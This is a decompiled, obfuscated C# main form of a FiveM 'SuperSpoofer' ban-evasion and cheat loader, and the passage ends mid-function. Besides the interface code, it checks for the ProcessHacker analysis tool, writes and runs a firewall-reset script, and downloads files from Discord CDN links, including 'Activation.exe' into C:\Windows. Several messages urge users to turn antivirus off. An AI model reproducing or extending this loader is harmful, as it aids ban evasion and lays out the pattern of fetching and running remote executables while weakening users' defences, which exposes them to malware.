using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net;
using System.Resources;
using System.Windows.Forms;
using OldRod.Core.CodeGen;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;
using SuperSpoofer;
using SuperSpoofer.Forms___Extras;
using SuperSpoofer.Forms___Spoofer;
using SuperSpoofer.UserSettingsOptions;

namespace KeyAuth
{
	// Token: 0x0200000C RID: 12
	public partial class Main : Form
	{
		// Token: 0x0600006C RID: 108 RVA: 0x00005DF8 File Offset: 0x00003FF8
		public Main()
		{
			Main.__VMFUNCTION__58384(this);
			this.timer3.Start();
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00005EE4 File Offset: 0x000040E4
		public static void __VMFUNCTION__58384(Main A_0)
		{
			A_0.components = (IContainer)new Container();
			ResourceManager resourceManager = new ComponentResourceManager(typeof(Main));
			A_0.siticonePanel3 = new SiticonePanel();
			A_0.green = new ProgressBar();
			A_0.red = new ProgressBar();
			A_0.blue = new ProgressBar();
			A_0.siticoneDragControl1 = new SiticoneDragControl(A_0.components);
			A_0.timer1 = new Timer(A_0.components);
			A_0.timer2 = new Timer(A_0.components);
			A_0.timer3 = new Timer(A_0.components);
			A_0.timer4 = new Timer(A_0.components);
			A_0.siticonePanel1 = new SiticonePanel();
			A_0.userin = new SiticoneButton();
			A_0.webtool = new SiticoneButton();
			A_0.siticoneGradientButton4 = new SiticoneButton();
			A_0.siticoneGradientButton3 = new SiticoneButton();
			A_0.spooferfixes = new SiticoneButton();
			A_0.systemspoof = new SiticoneButton();
			A_0.gamespoof = new SiticoneButton();
			A_0.dashboard = new SiticoneButton();
			A_0.siticoneControlBox1 = new SiticoneControlBox();
			A_0.siticoneControlBox2 = new SiticoneControlBox();
			A_0.siticonePanel3.SuspendLayout();
			A_0.siticonePanel1.SuspendLayout();
			A_0.SuspendLayout();
			A_0.siticonePanel3.BackColor = Color.FromArgb(70, 70, 80);
			A_0.siticonePanel3.BorderColor = Color.Gray;
			A_0.siticonePanel3.BorderThickness = 1;
			A_0.siticonePanel3.Controls.Add(A_0.green);
			A_0.siticonePanel3.Controls.Add(A_0.red);
			A_0.siticonePanel3.Controls.Add(A_0.blue);
			A_0.siticonePanel3.FillColor = Color.FromArgb(25, 26, 30);
			A_0.siticonePanel3.Location = new Point(12, 84);
			A_0.siticonePanel3.Name = "siticonePanel3";
			A_0.siticonePanel3.ShadowDecoration.Parent = A_0.siticonePanel3;
			A_0.siticonePanel3.Size = new Size(1043, 550);
			A_0.siticonePanel3.TabIndex = 2;
			A_0.siticonePanel3.Paint += A_0.__VMFUNCTION__69FF1;
			A_0.green.Location = new Point(930, 533);
			A_0.green.Maximum = 255;
			A_0.green.Name = "green";
			A_0.green.Size = new Size(50, 14);
			A_0.green.TabIndex = 74;
			A_0.green.Value = 255;
			A_0.green.Visible = false;
			A_0.red.Location = new Point(874, 533);
			A_0.red.Maximum = 255;
			A_0.red.Name = "red";
			A_0.red.Size = new Size(50, 14);
			A_0.red.TabIndex = 73;
			A_0.red.Value = 255;
			A_0.red.Visible = false;
			A_0.blue.Location = new Point(986, 533);
			A_0.blue.Maximum = 255;
			A_0.blue.Name = "blue";
			A_0.blue.Size = new Size(50, 14);
			A_0.blue.TabIndex = 75;
			A_0.blue.Value = 255;
			A_0.blue.Visible = false;
			A_0.siticoneDragControl1.TargetControl = A_0;
			A_0.timer1.Interval = 10;
			A_0.timer1.Tick += A_0.__VMFUNCTION__38197;
			A_0.timer2.Interval = 10;
			A_0.timer2.Tick += A_0.__VMFUNCTION__DF9A;
			A_0.timer3.Interval = 10;
			A_0.timer3.Tick += A_0.__VMFUNCTION__98F4E;
			A_0.timer4.Tick += A_0.__VMFUNCTION__40E6D;
			A_0.siticonePanel1.BackColor = Color.FromArgb(224, 224, 224);
			A_0.siticonePanel1.Controls.Add(A_0.userin);
			A_0.siticonePanel1.Controls.Add(A_0.webtool);
			A_0.siticonePanel1.Controls.Add(A_0.siticoneGradientButton4);
			A_0.siticonePanel1.Controls.Add(A_0.siticoneGradientButton3);
			A_0.siticonePanel1.Controls.Add(A_0.spooferfixes);
			A_0.siticonePanel1.Controls.Add(A_0.systemspoof);
			A_0.siticonePanel1.Controls.Add(A_0.gamespoof);
			A_0.siticonePanel1.Controls.Add(A_0.dashboard);
			A_0.siticonePanel1.FillColor = Color.FromArgb(34, 33, 37);
			A_0.siticonePanel1.Location = new Point(-7, 25);
			A_0.siticonePanel1.Name = "siticonePanel1";
			A_0.siticonePanel1.ShadowDecoration.Parent = A_0.siticonePanel1;
			A_0.siticonePanel1.Size = new Size(1085, 49);
			A_0.siticonePanel1.TabIndex = 76;
			A_0.userin.CheckedState.Parent = A_0.userin;
			A_0.userin.CustomBorderColor = Color.DimGray;
			A_0.userin.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.userin.CustomImages.Parent = A_0.userin;
			A_0.userin.FillColor = Color.FromArgb(34, 33, 37);
			A_0.userin.Font = new Font("Segoe UI", 9f);
			A_0.userin.ForeColor = Color.LightGray;
			A_0.userin.HoveredState.Parent = A_0.userin;
			A_0.userin.Location = new Point(937, 7);
			A_0.userin.Name = "userin";
			A_0.userin.ShadowDecoration.Parent = A_0.userin;
			A_0.userin.Size = new Size(125, 35);
			A_0.userin.TabIndex = 8;
			A_0.userin.Text = "Settings";
			A_0.userin.Click += A_0.__VMFUNCTION__3785B;
			A_0.webtool.CheckedState.Parent = A_0.webtool;
			A_0.webtool.CustomBorderColor = Color.DimGray;
			A_0.webtool.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.webtool.CustomImages.Parent = A_0.webtool;
			A_0.webtool.FillColor = Color.FromArgb(34, 33, 37);
			A_0.webtool.Font = new Font("Segoe UI", 9f);
			A_0.webtool.ForeColor = Color.LightGray;
			A_0.webtool.HoveredState.Parent = A_0.webtool;
			A_0.webtool.Location = new Point(806, 7);
			A_0.webtool.Name = "webtool";
			A_0.webtool.ShadowDecoration.Parent = A_0.webtool;
			A_0.webtool.Size = new Size(125, 35);
			A_0.webtool.TabIndex = 7;
			A_0.webtool.Text = "Discord Tools";
			A_0.webtool.Click += A_0.__VMFUNCTION__FDDA;
			A_0.siticoneGradientButton4.CheckedState.Parent = A_0.siticoneGradientButton4;
			A_0.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			A_0.siticoneGradientButton4.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.siticoneGradientButton4.CustomImages.Parent = A_0.siticoneGradientButton4;
			A_0.siticoneGradientButton4.FillColor = Color.FromArgb(34, 33, 37);
			A_0.siticoneGradientButton4.Font = new Font("Segoe UI", 9f);
			A_0.siticoneGradientButton4.ForeColor = Color.LightGray;
			A_0.siticoneGradientButton4.HoveredState.Parent = A_0.siticoneGradientButton4;
			A_0.siticoneGradientButton4.Location = new Point(675, 7);
			A_0.siticoneGradientButton4.Name = "siticoneGradientButton4";
			A_0.siticoneGradientButton4.ShadowDecoration.Parent = A_0.siticoneGradientButton4;
			A_0.siticoneGradientButton4.Size = new Size(125, 35);
			A_0.siticoneGradientButton4.TabIndex = 6;
			A_0.siticoneGradientButton4.Text = "FiveM Dumper";
			A_0.siticoneGradientButton4.Click += A_0.__VMFUNCTION__460BE;
			A_0.siticoneGradientButton3.CheckedState.Parent = A_0.siticoneGradientButton3;
			A_0.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			A_0.siticoneGradientButton3.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.siticoneGradientButton3.CustomImages.Parent = A_0.siticoneGradientButton3;
			A_0.siticoneGradientButton3.FillColor = Color.FromArgb(34, 33, 37);
			A_0.siticoneGradientButton3.Font = new Font("Segoe UI", 9f);
			A_0.siticoneGradientButton3.ForeColor = Color.LightGray;
			A_0.siticoneGradientButton3.HoveredState.Parent = A_0.siticoneGradientButton3;
			A_0.siticoneGradientButton3.Location = new Point(544, 7);
			A_0.siticoneGradientButton3.Name = "siticoneGradientButton3";
			A_0.siticoneGradientButton3.ShadowDecoration.Parent = A_0.siticoneGradientButton3;
			A_0.siticoneGradientButton3.Size = new Size(125, 35);
			A_0.siticoneGradientButton3.TabIndex = 5;
			A_0.siticoneGradientButton3.Text = "Lua Executor";
			A_0.siticoneGradientButton3.Click += A_0.__VMFUNCTION__2DADA;
			A_0.spooferfixes.CheckedState.Parent = A_0.spooferfixes;
			A_0.spooferfixes.CustomBorderColor = Color.DimGray;
			A_0.spooferfixes.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.spooferfixes.CustomImages.Parent = A_0.spooferfixes;
			A_0.spooferfixes.FillColor = Color.FromArgb(34, 33, 37);
			A_0.spooferfixes.Font = new Font("Segoe UI", 9f);
			A_0.spooferfixes.ForeColor = Color.LightGray;
			A_0.spooferfixes.HoveredState.Parent = A_0.spooferfixes;
			A_0.spooferfixes.Location = new Point(412, 7);
			A_0.spooferfixes.Name = "spooferfixes";
			A_0.spooferfixes.ShadowDecoration.Parent = A_0.spooferfixes;
			A_0.spooferfixes.Size = new Size(125, 35);
			A_0.spooferfixes.TabIndex = 4;
			A_0.spooferfixes.Text = "Spoofer Fixes";
			A_0.spooferfixes.Click += A_0.__VMFUNCTION__5408C;
			A_0.systemspoof.CheckedState.Parent = A_0.systemspoof;
			A_0.systemspoof.CustomBorderColor = Color.DimGray;
			A_0.systemspoof.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.systemspoof.CustomImages.Parent = A_0.systemspoof;
			A_0.systemspoof.FillColor = Color.FromArgb(34, 33, 37);
			A_0.systemspoof.Font = new Font("Segoe UI", 9f);
			A_0.systemspoof.ForeColor = Color.LightGray;
			A_0.systemspoof.HoveredState.Parent = A_0.systemspoof;
			A_0.systemspoof.Location = new Point(281, 7);
			A_0.systemspoof.Name = "systemspoof";
			A_0.systemspoof.ShadowDecoration.Parent = A_0.systemspoof;
			A_0.systemspoof.Size = new Size(125, 35);
			A_0.systemspoof.TabIndex = 3;
			A_0.systemspoof.Text = "System Spoofer";
			A_0.systemspoof.Click += A_0.__VMFUNCTION__40F9F;
			A_0.gamespoof.CheckedState.Parent = A_0.gamespoof;
			A_0.gamespoof.CustomBorderColor = Color.DimGray;
			A_0.gamespoof.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.gamespoof.CustomImages.Parent = A_0.gamespoof;
			A_0.gamespoof.FillColor = Color.FromArgb(34, 33, 37);
			A_0.gamespoof.Font = new Font("Segoe UI", 9f);
			A_0.gamespoof.ForeColor = Color.LightGray;
			A_0.gamespoof.HoveredState.Parent = A_0.gamespoof;
			A_0.gamespoof.Location = new Point(150, 7);
			A_0.gamespoof.Name = "gamespoof";
			A_0.gamespoof.ShadowDecoration.Parent = A_0.gamespoof;
			A_0.gamespoof.Size = new Size(125, 35);
			A_0.gamespoof.TabIndex = 2;
			A_0.gamespoof.Text = "FiveM Spoofer";
			A_0.gamespoof.Click += A_0.__VMFUNCTION__2DCE4;
			A_0.dashboard.CheckedState.Parent = A_0.dashboard;
			A_0.dashboard.CustomBorderColor = Color.DimGray;
			A_0.dashboard.CustomBorderThickness = new Padding(0, 0, 0, 3);
			A_0.dashboard.CustomImages.Parent = A_0.dashboard;
			A_0.dashboard.FillColor = Color.FromArgb(34, 33, 37);
			A_0.dashboard.Font = new Font("Segoe UI", 9f);
			A_0.dashboard.ForeColor = Color.LightGray;
			A_0.dashboard.HoveredState.Parent = A_0.dashboard;
			A_0.dashboard.Location = new Point(19, 7);
			A_0.dashboard.Name = "dashboard";
			A_0.dashboard.ShadowDecoration.Parent = A_0.dashboard;
			A_0.dashboard.Size = new Size(125, 35);
			A_0.dashboard.TabIndex = 1;
			A_0.dashboard.Text = "Dashboard";
			A_0.dashboard.Click += A_0.__VMFUNCTION__6B4F9;
			A_0.siticoneControlBox1.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			A_0.siticoneControlBox1.ControlBoxStyle = ControlBoxStyle.Custom;
			A_0.siticoneControlBox1.Cursor = Cursors.Hand;
			A_0.siticoneControlBox1.FillColor = Color.FromArgb(25, 26, 30);
			A_0.siticoneControlBox1.HoveredState.FillColor = Color.FromArgb(25, 26, 30);
			A_0.siticoneControlBox1.HoveredState.Parent = A_0.siticoneControlBox1;
			A_0.siticoneControlBox1.IconColor = Color.Red;
			A_0.siticoneControlBox1.Location = new Point(1051, 0);
			A_0.siticoneControlBox1.Name = "siticoneControlBox1";
			A_0.siticoneControlBox1.ShadowDecoration.Parent = A_0.siticoneControlBox1;
			A_0.siticoneControlBox1.Size = new Size(26, 22);
			A_0.siticoneControlBox1.TabIndex = 0;
			A_0.siticoneControlBox1.Click += A_0.__VMFUNCTION__EB4F;
			A_0.siticoneControlBox2.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			A_0.siticoneControlBox2.ControlBoxStyle = ControlBoxStyle.Custom;
			A_0.siticoneControlBox2.ControlBoxType = ControlBoxType.MinimizeBox;
			A_0.siticoneControlBox2.Cursor = Cursors.Hand;
			A_0.siticoneControlBox2.FillColor = Color.FromArgb(25, 26, 30);
			A_0.siticoneControlBox2.HoveredState.FillColor = Color.FromArgb(25, 26, 30);
			A_0.siticoneControlBox2.HoveredState.Parent = A_0.siticoneControlBox2;
			A_0.siticoneControlBox2.IconColor = Color.Red;
			A_0.siticoneControlBox2.Location = new Point(1029, 0);
			A_0.siticoneControlBox2.Name = "siticoneControlBox2";
			A_0.siticoneControlBox2.ShadowDecoration.Parent = A_0.siticoneControlBox2;
			A_0.siticoneControlBox2.Size = new Size(26, 22);
			A_0.siticoneControlBox2.TabIndex = 77;
			A_0.AutoScaleDimensions = new SizeF(6f, 13f);
			A_0.AutoScaleMode = AutoScaleMode.Font;
			A_0.AutoValidate = AutoValidate.Disable;
			A_0.BackColor = Color.FromArgb(25, 26, 30);
			A_0.ClientSize = new Size(1075, 646);
			A_0.Controls.Add(A_0.siticoneControlBox2);
			A_0.Controls.Add(A_0.siticoneControlBox1);
			A_0.Controls.Add(A_0.siticonePanel1);
			A_0.Controls.Add(A_0.siticonePanel3);
			A_0.FormBorderStyle = FormBorderStyle.None;
			A_0.Icon = (Icon)resourceManager.GetObject("$this.Icon");
			A_0.Name = "Main";
			A_0.StartPosition = FormStartPosition.CenterScreen;
			A_0.Text = "Loader";
			A_0.TransparencyKey = Color.Maroon;
			A_0.Load += A_0.__VMFUNCTION__A24E0;
			A_0.siticonePanel3.ResumeLayout(false);
			A_0.siticonePanel1.ResumeLayout(false);
			A_0.ResumeLayout(false);
		}

		// Token: 0x0600006F RID: 111 RVA: 0x0000708C File Offset: 0x0000528C
		public void __VMFUNCTION__69FF1(object A_1, PaintEventArgs A_2)
		{
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000070A0 File Offset: 0x000052A0
		public void __VMFUNCTION__38197(object A_1, EventArgs A_2)
		{
			this.BackColor = Color.FromArgb(this.r, this.g, this.b);
			uint num;
			if ((((uint)this.r > (uint)0) ? 1U : 0U) != (uint)0)
			{
				num = (((uint)this.b == (uint)0) ? 1U : 0U);
			}
			else
			{
				num = (uint)0;
			}
			if (num != (uint)0)
			{
				this.r = (int)((uint)this.r + ~(uint)1 + (uint)1);
				this.g = (int)((uint)this.g + (uint)1);
			}
			uint num2;
			if ((((uint)this.g > (uint)0) ? 1U : 0U) != (uint)0)
			{
				num2 = (((uint)this.r == (uint)0) ? 1U : 0U);
			}
			else
			{
				num2 = (uint)0;
			}
			if (num2 != (uint)0)
			{
				this.g = (int)((uint)this.g + ~(uint)1 + (uint)1);
				this.b = (int)((uint)this.b + (uint)1);
			}
			uint num3;
			if ((((uint)this.b > (uint)0) ? 1U : 0U) != (uint)0)
			{
				num3 = (((uint)this.g == (uint)0) ? 1U : 0U);
			}
			else
			{
				num3 = (uint)0;
			}
			if (num3 != (uint)0)
			{
				this.b = (int)((uint)this.b + ~(uint)1 + (uint)1);
				this.r = (int)((uint)this.r + (uint)1);
			}
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00007204 File Offset: 0x00005404
		public void __VMFUNCTION__DF9A(object A_1, EventArgs A_2)
		{
			this.siticonePanel1.FillColor = Color.FromArgb(this.r, this.g, this.b);
			uint num;
			if ((((uint)this.r > (uint)0) ? 1U : 0U) != (uint)0)
			{
				num = (((uint)this.b == (uint)0) ? 1U : 0U);
			}
			else
			{
				num = (uint)0;
			}
			if (num != (uint)0)
			{
				this.r = (int)((uint)this.r + ~(uint)1 + (uint)1);
				this.g = (int)((uint)this.g + (uint)1);
			}
			uint num2;
			if ((((uint)this.g > (uint)0) ? 1U : 0U) != (uint)0)
			{
				num2 = (((uint)this.r == (uint)0) ? 1U : 0U);
			}
			else
			{
				num2 = (uint)0;
			}
			if (num2 != (uint)0)
			{
				this.g = (int)((uint)this.g + ~(uint)1 + (uint)1);
				this.b = (int)((uint)this.b + (uint)1);
			}
			uint num3;
			if ((((uint)this.b > (uint)0) ? 1U : 0U) != (uint)0)
			{
				num3 = (((uint)this.g == (uint)0) ? 1U : 0U);
			}
			else
			{
				num3 = (uint)0;
			}
			if (num3 != (uint)0)
			{
				this.b = (int)((uint)this.b + ~(uint)1 + (uint)1);
				this.r = (int)((uint)this.r + (uint)1);
			}
		}

		// Token: 0x06000072 RID: 114 RVA: 0x0000736C File Offset: 0x0000556C
		public void __VMFUNCTION__98F4E(object A_1, EventArgs A_2)
		{
			if (((Process.GetProcessesByName("ProcessHacker").Length == (int)((uint)0)) ? 1U : 0U) != (uint)0)
			{
				<Module>.__VMFUNCTION__55E7A(this);
			}
			else
			{
				<Module>.__VMFUNCTION__362E4(this);
			}
		}

		// Token: 0x06000073 RID: 115 RVA: 0x000073B0 File Offset: 0x000055B0
		public void __VMFUNCTION__40E6D(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000074 RID: 116 RVA: 0x000073C4 File Offset: 0x000055C4
		public void __VMFUNCTION__3785B(object A_1, EventArgs A_2)
		{
			this.siticonePanel3.Controls.Clear();
			Form form = new userinformation
			{
				Dock = DockStyle.Fill,
				TopLevel = false,
				TopMost = true
			};
			form.FormBorderStyle = FormBorderStyle.None;
			this.siticonePanel3.Controls.Add(form);
			form.Show();
			this.userin.CustomBorderColor = Color.FromArgb(this.red.Value, this.green.Value, this.blue.Value);
			this.dashboard.CustomBorderColor = Color.DimGray;
			this.gamespoof.CustomBorderColor = Color.DimGray;
			this.systemspoof.CustomBorderColor = Color.DimGray;
			this.spooferfixes.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			this.webtool.CustomBorderColor = Color.DimGray;
		}

		// Token: 0x06000075 RID: 117 RVA: 0x000074C4 File Offset: 0x000056C4
		public void __VMFUNCTION__FDDA(object A_1, EventArgs A_2)
		{
			this.siticonePanel3.Controls.Clear();
			Form form = new WebhookTool
			{
				Dock = DockStyle.Fill,
				TopLevel = false,
				TopMost = true
			};
			form.FormBorderStyle = FormBorderStyle.None;
			this.siticonePanel3.Controls.Add(form);
			form.Show();
			this.webtool.CustomBorderColor = Color.FromArgb(this.red.Value, this.green.Value, this.blue.Value);
			this.dashboard.CustomBorderColor = Color.DimGray;
			this.gamespoof.CustomBorderColor = Color.DimGray;
			this.systemspoof.CustomBorderColor = Color.DimGray;
			this.spooferfixes.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			this.userin.CustomBorderColor = Color.DimGray;
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000075C4 File Offset: 0x000057C4
		public void __VMFUNCTION__460BE(object A_1, EventArgs A_2)
		{
			MessageBox.Show("Feature will be available soon!", "[SOON] Not Available");
		}

		// Token: 0x06000077 RID: 119 RVA: 0x000075E8 File Offset: 0x000057E8
		public void __VMFUNCTION__2DADA(object A_1, EventArgs A_2)
		{
			MessageBox.Show("Feature will be available soon!", "[SOON] Not Available");
		}

		// Token: 0x06000078 RID: 120 RVA: 0x0000760C File Offset: 0x0000580C
		public void __VMFUNCTION__5408C(object A_1, EventArgs A_2)
		{
			this.siticonePanel3.Controls.Clear();
			Form form = new spooferfixes
			{
				Dock = DockStyle.Fill,
				TopLevel = false,
				TopMost = true
			};
			form.FormBorderStyle = FormBorderStyle.None;
			this.siticonePanel3.Controls.Add(form);
			form.Show();
			this.spooferfixes.CustomBorderColor = Color.FromArgb(this.red.Value, this.green.Value, this.blue.Value);
			this.dashboard.CustomBorderColor = Color.DimGray;
			this.gamespoof.CustomBorderColor = Color.DimGray;
			this.systemspoof.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			this.webtool.CustomBorderColor = Color.DimGray;
			this.userin.CustomBorderColor = Color.DimGray;
		}

		// Token: 0x06000079 RID: 121 RVA: 0x0000770C File Offset: 0x0000590C
		public void __VMFUNCTION__40F9F(object A_1, EventArgs A_2)
		{
			this.siticonePanel3.Controls.Clear();
			Form form = new systemspoofer
			{
				Dock = DockStyle.Fill,
				TopLevel = false,
				TopMost = true
			};
			form.FormBorderStyle = FormBorderStyle.None;
			this.siticonePanel3.Controls.Add(form);
			form.Show();
			this.systemspoof.CustomBorderColor = Color.FromArgb(this.red.Value, this.green.Value, this.blue.Value);
			this.dashboard.CustomBorderColor = Color.DimGray;
			this.gamespoof.CustomBorderColor = Color.DimGray;
			this.spooferfixes.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			this.webtool.CustomBorderColor = Color.DimGray;
			this.userin.CustomBorderColor = Color.DimGray;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x0000780C File Offset: 0x00005A0C
		public void __VMFUNCTION__2DCE4(object A_1, EventArgs A_2)
		{
			this.siticonePanel3.Controls.Clear();
			Form form = new gamespoofer
			{
				Dock = DockStyle.Fill,
				TopLevel = false,
				TopMost = true
			};
			form.FormBorderStyle = FormBorderStyle.None;
			this.siticonePanel3.Controls.Add(form);
			form.Show();
			this.gamespoof.CustomBorderColor = Color.FromArgb(this.red.Value, this.green.Value, this.blue.Value);
			this.dashboard.CustomBorderColor = Color.DimGray;
			this.systemspoof.CustomBorderColor = Color.DimGray;
			this.spooferfixes.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			this.webtool.CustomBorderColor = Color.DimGray;
			this.userin.CustomBorderColor = Color.DimGray;
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000790C File Offset: 0x00005B0C
		public void __VMFUNCTION__6B4F9(object A_1, EventArgs A_2)
		{
			this.siticonePanel3.Controls.Clear();
			Form form = new dashboard
			{
				Dock = DockStyle.Fill,
				TopLevel = false,
				TopMost = true
			};
			form.FormBorderStyle = FormBorderStyle.None;
			this.siticonePanel3.Controls.Add(form);
			form.Show();
			this.dashboard.CustomBorderColor = Color.FromArgb(this.red.Value, this.green.Value, this.blue.Value);
			this.gamespoof.CustomBorderColor = Color.DimGray;
			this.systemspoof.CustomBorderColor = Color.DimGray;
			this.spooferfixes.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			this.webtool.CustomBorderColor = Color.DimGray;
			this.userin.CustomBorderColor = Color.DimGray;
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00007A0C File Offset: 0x00005C0C
		public void __VMFUNCTION__EB4F(object A_1, EventArgs A_2)
		{
			Application.Exit();
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00007A28 File Offset: 0x00005C28
		public void __VMFUNCTION__A24E0(object A_1, EventArgs A_2)
		{
			this.timer4.Start();
			try
			{
				new SoundPlayer("C:\\Windows\\Media\\Windows Unlock.wav").Play();
			}
			catch (Exception ex)
			{
			}
			this.siticonePanel3.Controls.Clear();
			Form form = new dashboard
			{
				Dock = DockStyle.Fill,
				TopLevel = false,
				TopMost = true
			};
			form.FormBorderStyle = FormBorderStyle.None;
			this.siticonePanel3.Controls.Add(form);
			form.Show();
			this.dashboard.CustomBorderColor = Color.FromArgb(this.red.Value, this.green.Value, this.blue.Value);
			this.gamespoof.CustomBorderColor = Color.DimGray;
			this.systemspoof.CustomBorderColor = Color.DimGray;
			this.spooferfixes.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton3.CustomBorderColor = Color.DimGray;
			this.siticoneGradientButton4.CustomBorderColor = Color.DimGray;
			this.webtool.CustomBorderColor = Color.DimGray;
			this.userin.CustomBorderColor = Color.DimGray;
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00007B64 File Offset: 0x00005D64
		public void __VMFUNCTION__43B00(object A_1, EventArgs A_2)
		{
			try
			{
				Process.Start("https://t.me/superwooferx");
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not open the link, turn antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00007BB8 File Offset: 0x00005DB8
		public void __VMFUNCTION__1968B(object A_1, EventArgs A_2)
		{
			try
			{
				Process.Start("https://discord.gg/fivemunban");
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not open the link, turn antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00007C0C File Offset: 0x00005E0C
		public void __VMFUNCTION__26D78(object A_1, EventArgs A_2)
		{
			Process.Start("https://superspoofer.xyz/");
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00007C2C File Offset: 0x00005E2C
		public void __VMFUNCTION__61A25(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00007C40 File Offset: 0x00005E40
		public void __VMFUNCTION__9448F(object A_1, PaintEventArgs A_2)
		{
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00007C54 File Offset: 0x00005E54
		public void __VMFUNCTION__34FCE(object A_1, PaintEventArgs A_2)
		{
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00007C68 File Offset: 0x00005E68
		public void __VMFUNCTION__6A81C(object A_1, EventArgs A_2)
		{
			new fivembuildchanger().ShowDialog();
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00007C88 File Offset: 0x00005E88
		public void __VMFUNCTION__554CB(object A_1, PaintEventArgs A_2)
		{
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00007C9C File Offset: 0x00005E9C
		public void __VMFUNCTION__A22B7(object A_1, EventArgs A_2)
		{
			try
			{
				using (TextWriter textWriter = new StreamWriter("C:\\Windows\\SuperProj\\Drive\\firewallreset.cmd"))
				{
					textWriter.WriteLine("netsh advfirewall reset");
				}
				Process.Start("C:\\Windows\\SuperProj\\Drive\\firewallreset.cmd");
				MessageBox.Show("We have reset the firewall! All defaults are now set back, spoof when ready!", "Super Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Cannot reset firewall, please put on C:\\ drive or turn antivirus off!", "Super Spoofer - Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00007D4C File Offset: 0x00005F4C
		public void __VMFUNCTION__1E719(object A_1, EventArgs A_2)
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/934620124483317830/971901156236337212/method2022.txt", "C:\\method.txt");
				Process.Start("C:\\method.txt");
			}
			catch (Exception ex)
			{
				MessageBox.Show("Cannot download method, please put on C:\\ drive or turn antivirus off!", "Super Spoofer - Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00007DB4 File Offset: 0x00005FB4
		public void __VMFUNCTION__3E06F(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00007DC8 File Offset: 0x00005FC8
		public void __VMFUNCTION__84249(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00007DDC File Offset: 0x00005FDC
		public void __VMFUNCTION__699F1(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00007DF0 File Offset: 0x00005FF0
		public void __VMFUNCTION__3CF87(object A_1, EventArgs A_2)
		{
			try
			{
				string path = Login.KeyAuthApp.var("maindir");
				if ((((Directory.Exists(path) ? 1U : 0U) == (uint)0) ? 1U : 0U) != (uint)0)
				{
					Directory.CreateDirectory(path);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not complete function [DIR-CIR], Your windows is not compatiable!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00007E6C File Offset: 0x0000606C
		public void __VMFUNCTION__8C702(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00007E80 File Offset: 0x00006080
		public void __VMFUNCTION__3D277(object A_1, EventArgs A_2)
		{
			Process.Start("https://sites.google.com/view/superspoofercc/fivem-unban-method?authuser=0");
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00007EA0 File Offset: 0x000060A0
		public void __VMFUNCTION__710E9(object A_1, EventArgs A_2)
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/896100252996755456/Activation.exe", "C:\\Windows\\Activation.exe");
